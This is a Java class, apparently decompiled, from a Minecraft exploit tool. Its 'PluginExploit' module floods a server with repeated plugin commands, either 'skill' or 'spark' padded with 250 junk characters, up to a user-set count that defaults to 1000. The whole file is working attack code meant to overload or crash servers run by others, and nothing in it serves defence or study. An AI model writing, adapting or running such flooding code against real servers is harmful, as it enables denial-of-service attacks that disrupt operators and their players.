package us.whitedev.exploits.impl;

import java.util.List;
import java.util.Locale;
import us.whitedev.exploits.Exploit;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class PluginExploit implements Exploit {
   private static final String EXPLOIT_NAME = "PluginExploit";

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      String mode = args[3].toLowerCase(Locale.ROOT);
      msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);
      String finalCommand = this.getCommand(mode);

      for(int i = 0; i < power; ++i) {
         PacketHelper.sendCommand(finalCommand);
      }

      msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
   }

   private String getCommand(String mode) {
      byte var3 = -1;
      switch(mode.hashCode()) {
      case 109496913:
         if (mode.equals("skill")) {
            var3 = 0;
         }
         break;
      case 109638365:
         if (mode.equals("spark")) {
            var3 = 1;
         }
      }

      switch(var3) {
      case 0:
         return "skill";
      case 1:
         return "spark " + "Â¿".repeat(250);
      default:
         return "";
      }
   }

   public String getName() {
      return "PluginExploit";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Mode", OptionType.LIST, new String[]{"Skill", "Spark"}));
   }

   public String getArgsUsage() {
      return "power[1000], mode[skill]";
   }

   public String getDescription() {
      return "Plugin Abuser";
   }
}
